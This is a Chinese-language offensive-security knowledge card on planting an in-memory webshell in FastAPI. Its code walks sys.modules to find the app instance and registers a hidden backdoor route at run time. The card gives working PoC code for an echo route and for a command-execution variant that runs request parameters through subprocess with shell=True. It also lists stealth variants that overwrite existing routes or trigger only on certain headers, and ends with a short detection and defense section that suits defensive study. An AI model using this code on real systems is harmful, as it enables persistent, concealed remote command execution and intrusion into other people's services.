---
id: web-python-framework-fastapi-sys-modules-route-memshell
title: FastAPI 路由注册内存马：遍历 sys.modules 定位 FastAPI 实例并动态注册后门路由
type: scenario
domain: web
path: web/python/framework
technique: fastapi-sys-modules-route-memshell
tags:
- web
- python
- fastapi
- starlette
- memshell
- persistence
- rce
- sys.modules
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V174
  verified_at: '2026-11-06T17:00:27+08:00'
  notes: 已对照原文核对：sys.modules 遍历 vars() 找 FastAPI 实例并 @app.get 注册 /JpM9 与截图 09-12、14 一致；文章明确该法在 langflow 工厂模式下失效，卡内变体已如实说明；无 sources/source_url。未实际执行 PoC。
url: /docs/web/python/framework/web-python-framework-fastapi-sys-modules-route-memshell/
draft: false
kb_aliases:
- FastAPI 路由内存马
- sys.modules 找 FastAPI app
- app.get 动态注册后门
- FastAPI 进程内 webshell
- FastAPI memshell
- 哥斯拉 FastAPI 内存马
---

## 一句话结论

拿到 FastAPI 进程内的任意 Python 代码执行后，遍历 `sys.modules` 各模块的 `vars()` 即可找回模块级 `app = FastAPI()` 实例；FastAPI/Starlette 没有 Flask 的 `setupmethod` 首请求后禁注册限制，直接 `@app.get`/`@app.post` 就能在运行期注册一个不落盘的后门路由，进程重启前一直有效。

## 原理

- 已导入模块都挂在 `sys.modules`（`dict[str, ModuleType]`）。典型 FastAPI 应用在模块顶层执行 `app = FastAPI()`，该实例就是模块全局变量之一；即使被多个模块导入，也能通过 `vars(module).items()` 找到。
- FastAPI 的路由注册本质是向 `app.router.routes` 追加 `APIRoute` 并绑定 endpoint 函数。`@app.get`/`@app.post` 装饰器在运行期调用 `add_api_route`，没有“首个请求后禁止修改”的状态校验，所以应用已经启动、正在处理请求时仍可追加路由。
- 新增路由只存在于当前进程的 Python 对象图里：磁盘文件、启动配置、OpenAPI 文档缓存都可能不更新，应用重启即消失，属于典型内存马。其 handler 能直接读取 `Request`（body/query/header）并返回 `Response`，可做回显型 webshell 或命令执行入口。
- 前置原语是进程内代码执行（不安全的 `/eval`、`/exec` 接口、SSTI、依赖漏洞 RCE 等）；本卡描述的是获得执行之后如何持久化与隐蔽化，不替代初始入口。

## 触发条件

- 已在 FastAPI 进程中执行任意 Python 代码。
- FastAPI 实例被至少一个已导入模块的全局命名空间引用（如 `main.py` 中的 `app`）；工厂函数创建后直接交给 `uvicorn.run(create_app(), ...)`、没有赋给模块变量的场景不适用（见变体）。
- 攻击者能访问目标端口并请求新注册路径。
- 单进程或可对每个 worker 分别注入；多 worker 时各进程内存独立。

## 利用步骤

1. 遍历 `sys.modules`，对每个模块的 `vars()` 做 `isinstance(obj, FastAPI)` 判断，收集实例（用 `id()` 去重，避免同一 app 被多个模块导出导致重复注册）。
2. 对找到的实例用 `@app.get`/`@app.post` 注册后门路由；handler 读取请求体并原样回显，先验证路由生效。
3. 访问新路径（如 `/JpM9`）确认返回 `WEBSHELL: ...`。
4. 需要命令执行时，把 handler 换成 `subprocess` 执行请求参数并返回输出；需要兼容现有 webshell 客户端时，投递对应插件载荷（如哥斯拉 Python 动态载荷）替换简单回显路由。

## PoC

定位并注册回显路由：

```python
import sys
from fastapi import FastAPI, Request, Response

seen = set()
for module in list(sys.modules.values()):
    if module is None:
        continue
    try:
        for name, obj in vars(module).items():
            if isinstance(obj, FastAPI) and id(obj) not in seen:
                seen.add(id(obj))

                @obj.get("/JpM9")
                @obj.post("/JpM9")
                async def shell(request: Request):
                    body = await request.body()
                    return Response(content=b"WEBSHELL: " + body,
                                    media_type="application/octet-stream")
    except Exception:
        pass
```

访问验证：

```bash
curl -s http://target:5003/JpM9 -d 'hello'
# WEBSHELL: hello
```

命令执行变体（仅授权测试环境使用）：

```python
@obj.post("/JpM9")
async def shell(request: Request):
    import subprocess
    cmd = (await request.json()).get("cmd", "id")
    out = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
    return {"out": out.stdout + out.stderr}
```

## 变体与关联

- 隐蔽变体：覆盖已有路由的 `route.endpoint`/`dependant`，或注册只在特定 Header/Cookie 存在时才进入后门逻辑的 handler，路由表看不出新增路径。
- 完整交互式内存马：拿到 `/exec` 一类原语后，直接执行哥斯拉兼容的 FastAPI 内存马载荷，再用哥斯拉客户端（PythonDynamicPayload、PYTHON_FASTAPI 加密器）连接后门路径执行命令；该载荷由客户端插件生成，不在本卡展开。
- 工厂模式失效：`uvicorn.run(create_app(), ...)` 或 `uvicorn.run("module:create_app", factory=True)` 时 app 实例不被模块全局引用，`sys.modules` 扫描为空，需要改用 `gc.get_objects()` 结合 ASGI 中间件 `__call__` 热补丁，见 [[web-python-framework-fastapi-gc-asgi-middleware-memshell]]。
- 同类框架：Flask 的等价技术见 [[web-python-framework-flask-route-registration-memshell]]，但 Flask 3.x 需先重置 `_got_first_request`，而 FastAPI/Starlette 无此限制。
- 多 worker：每个 worker 是独立进程，只注入处理请求的那个 worker 会出现“时有时无”；需遍历 worker 或改用可持久化入口。

## 检测与防御

- 检测：枚举 `app.router.routes`，比对源码/启动日志中声明的路由，关注运行期新增的 `APIRoute`；检查 endpoint 函数的 `__code__.co_filename` 是否为 `<string>`（`exec` 定义的强特征）、`__module__` 是否异常、是否为 lambda。
- 行为检测：对同一进程内 `sys.modules`/`gc.get_objects()` 的遍历、`app.router.routes.append`/`add_api_route` 的运行期调用做监控（可在启动后对路由列表做基线哈希并周期比对）。
- 防御：消除任意代码执行入口（本卡的前置条件）；生产环境限制 `/docs`、`/openapi.json` 暴露；发现注入后重启进程并轮换密钥，单删路由可能遗漏覆盖型后门。
